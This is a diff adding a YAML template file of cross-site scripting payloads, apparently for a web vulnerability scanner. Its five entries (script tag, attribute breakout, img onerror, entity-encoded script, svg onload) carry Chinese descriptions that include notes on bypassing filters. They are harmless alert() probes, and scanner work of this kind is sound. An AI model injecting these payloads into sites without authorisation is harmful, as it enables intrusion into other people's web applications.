@@ -1,0 +1,80 @@
+# script/payload/templates/xss.yaml
+
+# ================================
+#  XSS 基础 <script> 模板
+# ================================
+- id: xss_basic_script_1
+  vuln_type: xss
+  name: Basic <script> XSS payload
+  description: |
+    最常见的 <script> 注入方式，用于检测是否存在基础的存储型或反射型 XSS。
+    适合注入在 HTML body 内容区域。
+  payloads:
+    - "<script>alert(1)</script>"
+  preferred_contexts:
+    - html_body
+  risk_level: medium
+
+
+# ================================
+#  XSS 属性闭合（attribute breakout）
+# ================================
+- id: xss_attr_breakout_1
+  vuln_type: xss
+  name: Attribute breakout with <script>
+  description: |
+    尝试通过闭合 HTML 属性并注入 <script>，
+    常用于 HTML 属性型注入（例如 <input value="...">）。
+  payloads:
+    - '"><script>alert(2)</script>'
+  preferred_contexts:
+    - html_attr
+  risk_level: medium
+
+
+# ================================
+#  XSS onerror (IMG)
+# ================================
+- id: xss_onerror_img_1
+  vuln_type: xss
+  name: IMG onerror XSS payload
+  description: |
+    通过 <img> 的 onerror 事件触发脚本执行。
+    在很多过滤器中比 <script> 标签更容易成功。
+  payloads:
+    - '<img src=x onerror=alert(3)>'
+  preferred_contexts:
+    - html_body
+    - html_attr
+  risk_level: medium
+
+
+# ================================
+#  XSS HTML 实体编码绕过
+# ================================
+- id: xss_html_entity_1
+  vuln_type: xss
+  name: HTML entity encoded <script>
+  description: |
+    将 <script> 标签进行 HTML 实体编码，用于绕过简单的关键词过滤。
+  payloads:
+    - "&lt;script&gt;alert(4)&lt;/script&gt;"
+  preferred_contexts:
+    - html_body
+  risk_level: low
+
+
+# ================================
+#  XSS SVG onload
+# ================================
+- id: xss_svg_onload_1
+  vuln_type: xss
+  name: SVG onload XSS payload
+  description: |
+    SVG 持续是 XSS 的常见绕过手法，通过 <svg> 的 onload 事件触发执行。
+    在部分严格过滤环境下比 <img> 更容易绕过。
+  payloads:
+    - "<svg onload=alert(5)>"
+  preferred_contexts:
+    - html_body
+  risk_level: medium
